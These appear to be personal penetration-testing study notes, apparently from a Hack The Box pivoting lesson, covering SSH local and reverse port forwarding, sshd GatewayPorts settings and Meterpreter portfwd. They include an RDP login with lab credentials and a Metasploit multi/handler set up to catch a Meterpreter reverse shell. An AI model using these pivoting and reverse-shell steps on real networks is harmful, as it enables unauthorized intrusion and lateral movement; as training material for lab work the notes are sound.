
---
### Local Port Fowarding

---
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64 -N
#-L 1234: tells the SSH client to request the SSH server to forward all the data we send via 1234.
#localhost:3306: destination
```

#### Confirming Port Forward

---
ss/netstat
```bash
ss -antpl | grep 1234
```

Nmap
```bash
hcx05@htb[/htb]$ nmap -v -sV -p1234 localhost
```


### Remote/Reverse Port Forwarding with ssh

---
SSH -R
```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 -N ubuntu@<ipAddressofTarget> -vN
#Telling ssh to open a listening port, which is port 8080 on attack host.
#0.0.0.0:8080: Fowarding destination.
#-N: Don't cheate a shell interface.
```

`sshd_config` - Linux man page

```bash
GatewayPorts  
Specifies whether remote hosts are allowed to connect to ports forwarded for the client. By default, sshd(8) binds remote port forwardings to the loopback address. This prevents other remote hosts from connecting to forwarded ports. **GatewayPorts** can be used to specify that sshd should allow remote port forwardings to bind to non-loopback addresses, thus allowing other hosts to connect. The argument may be ''no'' to force remote port forwardings to be available to the local host only, ''yes'' to force remote port forwardings to bind to the wildcard address, or ''clientspecified'' to allow the client to select the address to which the forwarding is bound. The default is ''no''.
```

It doesn't allow other to connect in in default,so we have to modify `/etc/ssh/sshd_config` on `ubuntu` server.
```vim
GatewayPorts yes
# or
GatewatPorts clientspecified
```

Verify
```bash
ss -ntlp | grep 8080

... 172.16.5.129:8080 #Successed
... 0.0.0.0:8080 #Successed

... 127.0.0.1:8080 #Failed
```

If we can't modify the configuration file, use [Port Redirection](Port%20Redirection.md).

### Meterpreter Port Forwarding

---
#### Local Port Forwarding
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19 
#-l: Local port
#Pivot host is virtualize to a proxy as a Meterpreter session.
#-p: Target host's port
#-r: Target host's ip
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

Connecting to Windows Target through localhost```
```bash
hcx05@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Reverse Port Forwarding
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

Configuring & Starting multi/handler
```bash
meterpreter > bg [*] Backgrounding session 1... msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf
exploit(multi/handler) > set LPORT 8081 LPORT => 8081 msf exploit(multi/handler) > set LHOST 0.0.0.0 LHOST => 0.0.0.0 msf exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8081
```

Listening to a [Windows](../../03.Host%20Assault/Shell/Reverse%20shell/Windows.md).














